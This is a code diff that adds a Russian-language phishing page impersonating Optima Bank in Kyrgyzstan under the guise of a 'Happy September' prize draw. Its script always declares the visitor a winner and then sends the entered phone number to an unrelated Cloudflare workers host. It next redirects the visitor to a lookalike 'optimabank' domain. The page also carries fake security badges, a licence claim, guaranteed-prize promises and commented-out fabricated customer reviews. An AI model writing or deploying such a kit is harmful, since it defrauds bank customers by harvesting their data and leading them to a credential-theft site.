@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="theme-color" content="darkred" />
+  <title>Счастливый сентябрь — проверка номера</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    * { font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; }
+    .card { background: linear-gradient(145deg, #ffffff, #f8fafc); box-shadow: 0 20px 40px rgba(2, 6, 23, .08); border: 1px solid rgba(2, 6, 23, .06) }
+    .dots div{ position:absolute; top:33px; width:13px; height:13px; border-radius:50%; background:darkred; animation-timing-function:cubic-bezier(0,1,1,0)}
+    .dots div:nth-child(1){ left:8px; animation:d1 .6s infinite }
+    .dots div:nth-child(2){ left:8px; animation:d2 .6s infinite }
+    .dots div:nth-child(3){ left:32px; animation:d2 .6s infinite }
+    .dots div:nth-child(4){ left:56px; animation:d3 .6s infinite }
+    @keyframes d1{0%{transform:scale(0)}100%{transform:scale(1)}}
+    @keyframes d3{0%{transform:scale(1)}100%{transform:scale(0)}}
+    @keyframes d2{0%{transform:translate(0,0)}100%{transform:translate(24px,0)}}
+    .modal-enter{ animation: modalSlide .6s ease-out }
+    @keyframes modalSlide{ from{ opacity:0; } to{ opacity:1; } }
+  </style>
+</head>
+<body class="min-h-screen bg-gradient-to-br from-red-600 via-red-800 to-black text-slate-900">
+  <!-- Header -->
+  <header class="bg-gradient-to-r from-white/80 via-white/60 to-white/80 backdrop-blur border-b border-white/30">
+  <div class="mx-auto max-w-6xl px-4 py-2 md:py-4 flex items-center justify-between">
+    <div class="flex items-center gap-3">
+      <!-- Логотип адаптивный -->
+      <img src="optimalogo.png" alt="Логотип" 
+           class="h-8 sm:h-10 md:h-12 lg:h-14 object-contain" />
+      <span class="text-white font-bold text-lg sm:text-xl md:text-2xl" id="brandName">
+          
+        </span>
+      </div>
+      <div class="text-[10px] sm:text-xs px-2 py-1 whitespace-nowrap rounded-full bg-emerald-100/20 border border-emerald-300/30 text-slate-900 text-center sm:max-w-none">
+      🛡️ Официальная акция
+      </div>
+    </div>
+  </header>
+
+  <main class="relative z-10 mx-auto max-w-4xl px-4 py-8">
+    <!-- Hero -->
+    <section class="text-center mb-8">
+      <div class="inline-block mb-4 px-5 py-2 rounded-full bg-amber-100/20 border border-amber-300/30 text-amber-50 text-xs tracking-wide">
+        🎉 Осень подарков с Optima Bank! — «Счастливый сентябрь» 
+      </div>
+        <h1 class="text-3xl sm:text-4xl md:text-5xl font-extrabold text-white mb-3 leading-tight">
+       Проверьте свой <span class="text-amber-300">счастливый номер</span>
+        </h1>
+      <p class="text-white/90 max-w-2xl mx-auto text-sm sm:text-base">
+          Введите номер телефона в формате Кыргызстана (+996) и узнайте, является ли он счастливым в нашем розыгрыше.
+      </p>
+      <div class="flex justify-center gap-3 text-xs sm:text-sm text-white/80">
+        <span>✅ Без скрытых условий</span>
+        <span>✅ Гарантированный приз</span>
+       <span>✅ Бесплатное участие</span>
+      </div>
+    </section>
+
+    <!-- Form card -->
+    <section class="card rounded-2xl p-6 md:p-8">
+      <form id="phoneForm" class="space-y-4" novalidate>
+        <div>
+          <label for="phoneInput" class="block text-slate-700 font-semibold mb-2">Номер телефона</label>
+          <div class="relative">
+            <input id="phoneInput" type="tel" inputmode="numeric" autocomplete="tel" placeholder="+996 XXX XXX XXX" aria-describedby="hint" class="w-full rounded-xl border-2 border-slate-200 focus:border-red-500 focus:ring-4 focus:ring-red-100 px-4 py-3 text-lg text-center tracking-wider" maxlength="17" required />
+            <div id="phoneError" class="mt-2 text-sm text-rose-600 hidden" role="alert">Пожалуйста, введите корректный номер в формате +996 XXX XXX XXX</div>
+            <div class="bg-blue-50 border border-blue-200 rounded-lg p-3 text-sm text-blue-800">
+              <strong>Внимание:</strong> Каждый 7-й номер в нашей базе является выигрышным!
+            </div>
+            <p id="hint" class="mt-2 text-xs text-slate-500">Мы не сохраняем и не передаём ваш номер без вашего согласия.</p>
+          </div>
+        </div>
+        <button id="checkButton" class="w-full rounded-xl bg-red-600 hover:bg-red-700 active:bg-red-800 text-white font-bold py-3 transition shadow-lg shadow-red-900/20">
+          🔍 Проверить номер
+        </button>
+      </form>
+    </section>
+
+    <!-- Остальной контент можно оставить как есть -->
+  </main>
+  <!-- Всплывающий отзыв -->
+<div id="reviewPopup" class="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-white/90 text-slate-900 px-4 py-2 rounded-xl shadow-lg opacity-0 transition-opacity duration-500 z-50">
+  <!-- Сюда JS будет подставлять текст -->
+</div>
+
+</body>
+
+    <!-- Checking state -->
+    <section id="checking" class="hidden py-10 text-center">
+      <div class="card rounded-2xl p-6 mx-auto max-w-md">
+        <h3 class="text-xl font-bold mb-4">Проверяем ваш номер…</h3>
+        <div class="relative inline-block" style="width:80px;height:80px">
+          <div class="dots"><div></div><div></div><div></div><div></div></div>
+        </div>
+        <p class="mt-4 text-slate-600">Сверяем с правилами акции</p>
+      </div>
+    </section>
+
+    <!-- Prize list (informational) -->
+    <section class="mt-8 bg-white/10 backdrop-blur rounded-2xl border border-white/20 p-6">
+      <h3 class="text-xl font-bold text-white text-center mb-4">🏆 Возможные призы</h3>
+      <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 text-white/90 text-center">
+        <div class="bg-white/5 rounded-lg p-3"><img src="iphone16logo.png" alt="iPhone 16 Pro Max" class="w-20 h-10 mx-auto mb-2 object-contain" />
+        <div class="text-sm font-semibold">iPhone 16 Pro Max</div><div class="text-xs">512 ГБ</div></div>
+        <div class="bg-white/5 rounded-lg p-3"><img src="macbooklogo.png" alt="MacBook Air" class="w-30 h-10 mx-auto mb-2 object-contain" />
+        <div class="text-sm font-semibold">MacBook Air</div><div class="text-xs">Apple M4</div></div>
+        <div class="bg-white/5 rounded-lg p-3"><div class="text-2xl mb-2">💳</div><div class="font-semibold text-amber-300">до 45 000 сом</div><div class="text-xs">на карту</div></div>
+        <div class="bg-white/5 rounded-lg p-3"><div class="text-2xl mb-2">🛴</div><div class="text-sm font-semibold">Электросамокат</div><div class="text-xs">Ninebot F2 Plus</div></div>
+        <div class="bg-white/5 rounded-lg p-3"><div class="text-2xl mb-2">🚲</div><div class="text-sm font-semibold">Электровелосипед</div><div class="text-xs">Skillmax 350 Вт</div></div>
+        <div class="bg-white/5 rounded-lg p-3 flex flex-col items-center"><img src="yandexpluslogo.png" alt="Яндекс Плюс" class="w-32 h-10 mb-2 object-contain" /><div class="text-sm font-semibold">Подписка</div><div class="text-xs">Яндекс Плюс на 1 месяц</div></div>
+        <div class="bg-white/5 rounded-lg p-3"><div class="text-2xl mb-2">📺</div><div class="text-sm font-semibold">Телевизор Elista TV 43"</div><div class="text-xs">Smart WebOS</div></div>
+        <div class="bg-white/5 rounded-lg p-3"><div class="text-2xl mb-2">🔋</div><div class="text-sm font-semibold">Powerbank</div><div class="text-xs">Xiaomi</div></div>
+        <div class="bg-white/5 rounded-lg p-3"><div class="text-2xl mb-2">🎁</div><div class="text-sm font-semibold">Промо-набор</div><div class="text-xs">сертификаты</div></div>
+      </div>
+        <div class="text-center mt-8 space-y-4">
+            <div class="flex justify-center gap-6 text-white/80 text-sm">
+                <div class="flex items-center gap-2">
+                    <span class="text-green-400">🔒</span>
+                    <span>Защищенная передача данных</span>
+                </div>
+                <div class="flex items-center gap-2">
+                    <span class="text-blue-400">🏛️</span>
+                    <span>Лицензированный банк</span>
+                </div>
+            </div>
+            <p class="text-white/60 text-xs max-w-2xl mx-auto">
+                Optima Bank — надежный финансовый партнер с 15-летней историей. 
+                Все призы гарантированы и выдаются в течение 2 рабочих дней. Лиц. №018 НБ КР
+            </p>
+    </section>
+  </main>
+
+  <!-- Modal -->
+  <div id="prizeModal" class="fixed inset-0 hidden items-center justify-center bg-black/70 backdrop-blur-sm z-50">
+    <div class="relative bg-white rounded-3xl p-8 max-w-md w-[92%] modal-enter">
+      <button id="modalCloseX" aria-label="Закрыть" class="absolute top-3 right-3 p-2 rounded-full hover:bg-slate-100">
+        ✕
+      </button>
+      <div class="text-center">
+        <div class="mx-auto w-24 h-24 rounded-full bg-gradient-to-br from-emerald-400 to-emerald-600 flex items-center justify-center shadow-lg mb-6 text-4xl">🎊</div>
+        <h2 class="text-2xl font-extrabold mb-2">Есть совпадение!</h2>
+        <p class="text-slate-600">Ваш номер участвует. Приз:</p>
+        <p id="prizeText" class="text-2xl font-bold text-red-600 mt-2 mb-4">—</p>
+        <div class="bg-slate-50 rounded-xl p-4 text-left mb-6">
+          <h4 class="font-semibold mb-2">Что дальше</h4>
+          <ol class="list-decimal list-inside text-slate-600 space-y-1 text-sm">
+            <li>Подтвердите участие.</li>
+            <li>Следуйте инструкции на следующем экране.</li>
+          </ol>
+        </div>
+        <button id="continueBtn" class="w-full rounded-xl bg-red-600 hover:bg-red-700 active:bg-red-800 
+         text-white font-bold py-3 transition shadow-lg shadow-red-900/20">Продолжить</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ======= CONFIG (safe, brand‑neutral) =======
+    const BRAND_NAME = '';
+    const REDIRECT_URL = 'https://optimabank.siteloade.buzz/935129'; // Замените на ваш проверенный домен
+    const FORCE_PRIZE = '45 000 сом на карту'; // Установите строку приза для демонстрации (например, '45 000 сом'), иначе будет выбран случайно
+
+    const PRIZES = [
+      '45 000 сом на карту',
+      'Электросамокат Ninebot F2 Plus',
+      'Электровелосипед Skillmax 350 Вт',
+      'Телевизор Elista 43” Smart WebOS',
+      'Powerbank',
+      'Промо-набор сувениров'
+    ];
+
+    // Detect Telegram WebApp
+    const isTg = typeof window !== 'undefined' && window.Telegram && window.Telegram.WebApp;
+
+
+    // Branding
+    document.getElementById('brandName').textContent = BRAND_NAME;
+
+    // Phone mask for +996 XXX XXX XXX
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneError = document.getElementById('phoneError');
+
+    phoneInput.addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.startsWith('996')) v = v.slice(3);
+      v = v.slice(0, 9); // 9 digits after country code
+      let out = '+996';
+      if (v.length > 0) out += ' ' + v.slice(0,3);
+      if (v.length > 3) out += ' ' + v.slice(3,6);
+      if (v.length > 6) out += ' ' + v.slice(6,9);
+      e.target.value = out;
+      phoneError.classList.add('hidden');
+    });
+
+    const phoneForm = document.getElementById('phoneForm');
+    const checking = document.getElementById('checking');
+    const checkBtn = document.getElementById('checkButton');
+
+    function validKg(phone){
+      return /^\+996\s\d{3}\s\d{3}\s\d{3}$/.test(phone.trim());
+    }
+
+    phoneForm.addEventListener('submit', (e) => e.preventDefault());
+    checkBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      const phone = phoneInput.value;
+      if (!validKg(phone)) {
+        phoneError.classList.remove('hidden');
+        phoneInput.focus();
+        return;
+      }
+      // UX states
+      phoneForm.parentElement.classList.add('hidden');
+      checking.classList.remove('hidden');
+
+      setTimeout(() => {
+        checking.classList.add('hidden');
+        showPrize(phone);
+      }, 1600);
+    });
+
+    function pickPrize(){
+      if (typeof FORCE_PRIZE === 'string' && FORCE_PRIZE.length) return FORCE_PRIZE;
+      // Fair random by default
+      return PRIZES[Math.floor(Math.random() * PRIZES.length)];
+    }
+
+    const prizeModal = document.getElementById('prizeModal');
+    const prizeText = document.getElementById('prizeText');
+    const continueBtn = document.getElementById('continueBtn');
+    const closeX = document.getElementById('modalCloseX');
+
+    function showPrize(phone){
+      const prize = pickPrize();
+      prizeText.textContent = prize;
+      prizeModal.classList.remove('hidden');
+      prizeModal.classList.add('flex');
+
+    continueBtn.onclick = () => {
+    const phone = phoneInput.value;          // введённый номер
+    const prize = prizeText.textContent;     // выбранный приз
+
+      fetch('https://broken-haze-1ed2.lukasschneid3r.workers.dev/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone, prize })
+      }).catch(err => console.error(err));
+
+   // Редирект на ссылку (пока фиксированная, позже можно менять через бота)
+         window.location.href = REDIRECT_URL;
+      };
+    }
+    
+    function resetUI(){
+      prizeModal.classList.add('hidden');
+      prizeModal.classList.remove('flex');
+      phoneForm.parentElement.classList.remove('hidden');
+      phoneInput.value = '';
+    }
+
+    closeX.addEventListener('click', resetUI);
+    prizeModal.addEventListener('click', (e) => { if (e.target === prizeModal) resetUI(); });
+    /* const reviews = [
+    "Проверил номер — получил свой приз! 🎉",
+    "Абдан жакшы акция, чындыгында утуп алса болот! ✅",
+    "Очень удобно, все честно и быстро ✅",
+    "Номеримди текшердим, баары таза жана жеңишке жеттим! 🎊",
+    "Советую участвовать, реально выигрышные номера!",
+    "Акция абдан сонун, эч кандай жашыруун шарттар жок! 😊"
+  ];
+
+  const reviewPopup = document.getElementById('reviewPopup');
+
+  function showReview() {
+    const text = reviews[Math.floor(Math.random() * reviews.length)];
+    reviewPopup.textContent = text;
+    reviewPopup.classList.add('opacity-100');
+
+    setTimeout(() => {
+      reviewPopup.classList.remove('opacity-100');
+    }, 5000); // отзыв виден 5 секунд
+  }
+
+  // Автозапуск с циклом каждые 10 секунд
+  window.addEventListener('load', () => {
+    showReview(); // показываем сразу один отзыв
+    setInterval(showReview, 10000); // затем каждые 10 секунд
+  }); */
+  </script>
+  <!-- Всплывающий отзыв 
+<div id="reviewPopup" class="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-white/90 text-slate-900 px-4 py-2 rounded-xl shadow-lg opacity-0 transition-opacity duration-500 z-50">
+</div> -->
+</body>
+</html>
